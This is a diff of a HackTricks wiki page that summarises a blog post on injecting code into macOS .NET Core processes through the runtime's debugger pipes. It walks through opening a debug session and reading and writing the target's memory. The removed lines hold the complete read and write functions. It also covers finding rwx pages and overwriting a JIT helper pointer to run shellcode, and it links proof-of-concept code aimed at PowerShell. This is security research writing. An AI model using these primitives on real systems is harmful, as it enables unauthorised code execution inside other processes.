@@ -14,194 +14,119 @@ Other ways to support HackTricks:
 
 </details>
 
+**This is a summary of the post [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/). Check it for further details!**
+
 ## .NET Core Debugging <a href="#net-core-debugging" id="net-core-debugging"></a>
 
-### **Stablish a debugging session** <a href="#net-core-debugging" id="net-core-debugging"></a>
+### **Establishing a Debugging Session** <a href="#net-core-debugging" id="net-core-debugging"></a>
 
-[**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp) is responsible for handling debugger to debugee **communication**.\
-It creates a 2 of names pipes per .Net process in [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127) by calling [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27) (one will end in **`-in`** and the other in **`-out`** and the rest of the name will be the same).
+The handling of communication between debugger and debuggee in .NET is managed by [**dbgtransportsession.cpp**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp). This component sets up two named pipes per .NET process as seen in [dbgtransportsession.cpp#L127](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L127), which are initiated via [twowaypipe.cpp#L27](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/debug-pal/unix/twowaypipe.cpp#L27). These pipes are suffixed with **`-in`** and **`-out`**.
 
-So, if you go to the users **`$TMPDIR`** you will be able to find **debugging fifos** you could use to debug .Net applications:
+By visiting the user's **`$TMPDIR`**, one can find debugging FIFOs available for debugging .Net applications.
 
-<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-The function [**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) will handle the communication from a debugger.
-
-The first thing a debugger is required to do is to **create a new debugging session**. This is done by **sending a message via the `out` pipe** beginning with a `MessageHeader` struct, which we can grab from the .NET source:
+[**DbgTransportSession::TransportWorker**](https://github.com/dotnet/runtime/blob/0633ecfb79a3b2f1e4c098d1dd0166bc1ae41739/src/coreclr/debug/shared/dbgtransportsession.cpp#L1259) is responsible for managing communication from a debugger. To initiate a new debugging session, a debugger must send a message via the `out` pipe starting with a `MessageHeader` struct, detailed in the .NET source code:
 
 ```c
-struct MessageHeader
-{
-    MessageType   m_eType;        // Type of message this is
-    DWORD         m_cbDataBlock;  // Size of data block that immediately follows this header (can be zero)
-    DWORD         m_dwId;         // Message ID assigned by the sender of this message
-    DWORD         m_dwReplyId;    // Message ID that this is a reply to (used by messages such as MT_GetDCB)
-    DWORD         m_dwLastSeenId; // Message ID last seen by sender (receiver can discard up to here from send queue)
-    DWORD         m_dwReserved;   // Reserved for future expansion (must be initialized to zero and
-                                            // never read)
+struct MessageHeader {
+    MessageType   m_eType;        // Message type
+    DWORD         m_cbDataBlock;  // Size of following data block (can be zero)
+    DWORD         m_dwId;         // Message ID from sender
+    DWORD         m_dwReplyId;    // Reply-to Message ID
+    DWORD         m_dwLastSeenId; // Last seen Message ID by sender
+    DWORD         m_dwReserved;   // Reserved for future (initialize to zero)
         union {
             struct {
-                DWORD         m_dwMajorVersion;   // Protocol version requested/accepted
+                DWORD         m_dwMajorVersion;   // Requested/accepted protocol version
                 DWORD         m_dwMinorVersion;
             } VersionInfo;
           ...
         } TypeSpecificData;
-
-    BYTE                    m_sMustBeZero[8];
+    BYTE          m_sMustBeZero[8];
 }
 ```
 
-In the case of a new session request, this struct is populated as follows:
+To request a new session, this struct is populated as follows, setting the message type to `MT_SessionRequest` and the protocol version to the current version:
 
 ```c
 static const DWORD kCurrentMajorVersion = 2;
 static const DWORD kCurrentMinorVersion = 0;
 
-// Set the message type (in this case, we're establishing a session)
+// Configure the message type and version
 sSendHeader.m_eType = MT_SessionRequest;
-
-// Set the version
 sSendHeader.TypeSpecificData.VersionInfo.m_dwMajorVersion = kCurrentMajorVersion;
 sSendHeader.TypeSpecificData.VersionInfo.m_dwMinorVersion = kCurrentMinorVersion;
-
-// Finally set the number of bytes which follow this header
 sSendHeader.m_cbDataBlock = sizeof(SessionRequestData);
 ```
 
-Once constructed, we **send this over to the target** using the `write` syscall:
+This header is then sent over to the target using the `write` syscall, followed by the `sessionRequestData` struct containing a GUID for the session:
 
 ```c
 write(wr, &sSendHeader, sizeof(MessageHeader));
-```
-
-Following our header, we need to send over a `sessionRequestData` struct, which contains a GUID to identify our session:
-
-```c
-// All '9' is a GUID.. right??
 memset(&sDataBlock.m_sSessionID, 9, sizeof(SessionRequestData));
-
-// Send over the session request data
 write(wr, &sDataBlock, sizeof(SessionRequestData));
 ```
 
-Upon sending over our session request, we **read from the `out` pipe a header** that will indicate **if** our request to establish whether a debugger session has been **successful** or not:
+A read operation on the `out` pipe confirms the success or failure of the debugging session establishment:
 
 ```c
 read(rd, &sReceiveHeader, sizeof(MessageHeader));
 ```
 
-### Read Memory
-
-With a debugging sessions stablished it's possible to **read memory** using the message type [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896). To read some memory the main code needed would be:
+## Reading Memory
+Once a debugging session is established, memory can be read using the [`MT_ReadMemory`](https://github.com/dotnet/runtime/blob/f3a45a91441cf938765bafc795cbf4885cad8800/src/coreclr/src/debug/shared/dbgtransportsession.cpp#L1896) message type. The function readMemory is detailed, performing the necessary steps to send a read request and retrieve the response:
 
 ```c
 bool readMemory(void *addr, int len, unsigned char **output) {
-
-    *output = (unsigned char *)malloc(len);
-    if (*output == NULL) {
-        return false;
-    }
-
-    sSendHeader.m_dwId++; // We increment this for each request
-    sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
-    sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
-    sSendHeader.m_eType = MT_ReadMemory; // The type of request we are making
-    sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to read from
-    sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
-    sSendHeader.m_cbDataBlock = 0;
-
-    // Write the header
-    if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
-        return false;
-    }
-
-    // Read the response header
-    if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
-        return false;
-    }
-
-    // Make sure that memory could be read before we attempt to read further
-    if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
-        return false;
-    }
-
-    memset(*output, 0, len);
-    
-    // Read the memory from the debugee
-    if (read(rd, *output, sReceiveHeader.m_cbDataBlock) < 0) {
-        return false;
-    }
-
-    return true;
+// Allocation and initialization
+...
+// Write header and read response
+...
+// Read the memory from the debuggee
+...
+return true;
 }
 ```
 
-The proof of concept (POC) code found [here](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b).
+The complete proof of concept (POC) is available [here](https://gist.github.com/xpn/95eefc14918998853f6e0ab48d9f7b0b).
 
-### Write memory
+## Writing Memory
+
+Similarly, memory can be written using the `writeMemory` function. The process involves setting the message type to `MT_WriteMemory`, specifying the address and length of the data, and then sending the data:
 
 ```c
 bool writeMemory(void *addr, int len, unsigned char *input) {
-
-  sSendHeader.m_dwId++; // We increment this for each request
-  sSendHeader.m_dwLastSeenId = sReceiveHeader.m_dwId; // This needs to be set to the ID of our previous response
-  sSendHeader.m_dwReplyId = sReceiveHeader.m_dwId; // Similar to above, this indicates which ID we are responding to
-  sSendHeader.m_eType = MT_WriteMemory; // The type of request we are making
-  sSendHeader.TypeSpecificData.MemoryAccess.m_pbLeftSideBuffer = (PBYTE)addr; // Address to write to
-  sSendHeader.TypeSpecificData.MemoryAccess.m_cbLeftSideBuffer = len; // Number of bytes to write
-  sSendHeader.m_cbDataBlock = len;
-
-  // Write the header
-  if (write(wr, &sSendHeader, sizeof(sSendHeader)) < 0) {
-      return false;
-  }
-
-  // Write the data
-  if (write(wr, input, len) < 0) {
-      return false;
-  }
-
-  // Read the response header
-  if (read(rd, &sReceiveHeader, sizeof(sSendHeader)) < 0) {
-      return false;
-  }
-
-  // Ensure our memory write was successful
-  if (sReceiveHeader.TypeSpecificData.MemoryAccess.m_hrResult != 0) {
-      return false;
-  }
-
-  return true;
-
+// Increment IDs, set message type, and specify memory location
+...
+// Write header and data, then read the response
+...
+// Confirm memory write was successful
+...
+return true;
 }
 ```
 
-The POC code used to do this can be found [here](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5).
+The associated POC is available [here](https://gist.github.com/xpn/7c3040a7398808747e158a25745380a5).
 
-### .NET Core Code execution <a href="#net-core-code-execution" id="net-core-code-execution"></a>
+## .NET Core Code Execution <a href="#net-core-code-execution" id="net-core-code-execution"></a>
 
-The first thing is to identify for example a memory region with **`rwx`** running to save the shellcode to run. This can be easily done with:
+To execute code, one needs to identify a memory region with rwx permissions, which can be done using vmmap -pages:
 
 ```bash
 vmmap -pages [pid]
 vmmap -pages 35829 | grep "rwx/rwx"
 ```
 
-Then in order to trigger the execution it would be needed to know some place where a function pointer is stored to overwrite it. It's possible to overwrite a pointer within the **Dynamic Function Table (DFT)**, which is used by the .NET Core runtime to provide helper functions for JIT compilation. A list of supported function pointers can be found within [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h).
+Locating a place to overwrite a function pointer is necessary, and in .NET Core, this can be done by targeting the **Dynamic Function Table (DFT)**. This table, detailed in [`jithelpers.h`](https://github.com/dotnet/runtime/blob/6072e4d3a7a2a1493f514cdf4be75a3d56580e84/src/coreclr/src/inc/jithelpers.h), is used by the runtime for JIT compilation helper functions.
 
-In x64 versions this is straightforward using the mimikatz-esque **signature hunting** technique to search through **`libcorclr.dll`** for a reference to the symbol **`_hlpDynamicFuncTable`**, which we can dereference:
+For x64 systems, signature hunting can be used to find a reference to the symbol `_hlpDynamicFuncTable` in `libcorclr.dll`.
 
-<figure><img src="../../../.gitbook/assets/image (1) (3).png" alt=""><figcaption></figcaption></figure>
+The `MT_GetDCB` debugger function provides useful information, including the address of a helper function, `m_helperRemoteStartAddr`, indicating the location of `libcorclr.dll` in the process memory. This address is then used to start a search for the DFT and overwrite a function pointer with the shellcode's address.
 
-All that is left to do is to find an address from which to start our signature search. To do this, we leverage another exposed debugger function, **`MT_GetDCB`**. This returns a number of useful bits of information on the target process, but for our case, we are interested in a field returned containing the **address of a helper function**, **`m_helperRemoteStartAddr`**. Using this address, we know just **where `libcorclr.dll` is located** within the target process memory and we can start our search for the DFT.
-
-Knowing this address it's possible to overwrite the function pointer with our shellcodes one.
-
-The full POC code used to inject into PowerShell can be found [here](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6).
+The full POC code for injection into PowerShell is accessible [here](https://gist.github.com/xpn/b427998c8b3924ab1d63c89d273734b6).
 
 ## References
 
-* This technique was taken from [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)
+* [https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/](https://blog.xpnsec.com/macos-injection-via-third-party-frameworks/)
 
 <details>
 
